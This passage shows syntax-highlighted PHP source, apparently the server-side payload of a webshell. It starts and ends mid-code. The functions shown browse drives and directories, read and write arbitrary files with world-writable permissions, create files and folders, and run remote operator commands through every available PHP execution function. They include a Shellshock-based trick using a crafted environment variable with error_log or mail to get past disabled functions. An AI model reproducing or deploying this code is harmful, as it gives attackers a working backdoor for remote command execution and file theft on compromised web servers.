class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FileRoot'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_FILENAME</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$drivers</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'D'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'E'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'G'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'I'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'L'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'M'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'N'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'P'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'R'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'S'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'T'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'U'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'V'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'X'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Y'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$drivers</span> <span class="token keyword">as</span> <span class="token variable">$L</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$L</span><span class="token punctuation">}</span></span>:/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FileRoot'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$L</span><span class="token punctuation">}</span></span>:/;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FileRoot'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FileRoot'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_FILENAME</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FileRoot'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$result</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=&gt;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">.=</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">" : "</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'dirName'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$dir</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>@<span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$dir</span><span class="token operator">.=</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span> <span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$dir</span><span class="token punctuation">;</span> <span class="token variable">$allFiles</span> <span class="token operator">=</span> @<span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$allFiles</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token operator">.=</span><span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token operator">.=</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token operator">.=</span><span class="token variable">$path</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token operator">.=</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$allFiles</span> <span class="token keyword">as</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token operator">!=</span><span class="token string double-quoted-string">"."</span><span class="token operator">&amp;&amp;</span><span class="token variable">$fileName</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$fullPath</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$fileName</span><span class="token punctuation">;</span> <span class="token variable">$lineData</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$lineData</span><span class="token punctuation">,</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$lineData</span><span class="token punctuation">,</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$lineData</span><span class="token punctuation">,</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> @<span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$lineData</span><span class="token punctuation">,</span>@<span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$fr</span><span class="token operator">=</span><span class="token punctuation">(</span>@<span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"R"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>@<span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"W"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>@<span class="token function">is_executable</span><span class="token punctuation">(</span><span class="token variable">$fullPath</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"X"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$lineData</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$fr</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token operator">?</span><span class="token variable">$fr</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token operator">.=</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\t"</span><span class="token punctuation">,</span><span class="token variable">$lineData</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"Path Not Found Or No Permission!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">readFileContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"is_readable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"No Permission!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"File Not Found"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">uploadFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$fileValue</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileValue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token variable">$fileValue</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">newDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dirName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">newFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">function_existsEx</span><span class="token punctuation">(</span><span class="token variable">$functionName</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$d</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token variable">$d</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'strtolower'</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$functionName</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$functionName</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$functionName</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">execCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$cmdLine</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmdLine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span><span class="token operator">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span><span class="token operator">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$result</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"runshellshock"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">function</span> <span class="token function-definition function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'putenv'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">readlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bash"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() { x; }; <span class="token interpolation"><span class="token variable">$c</span></span> &gt;<span class="token interpolation"><span class="token variable">$tmp</span></span> 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">=</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">=</span>@<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">.=</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> @<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$p</span> <span class="token operator">=</span> @<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$io</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">.=</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">.=</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token 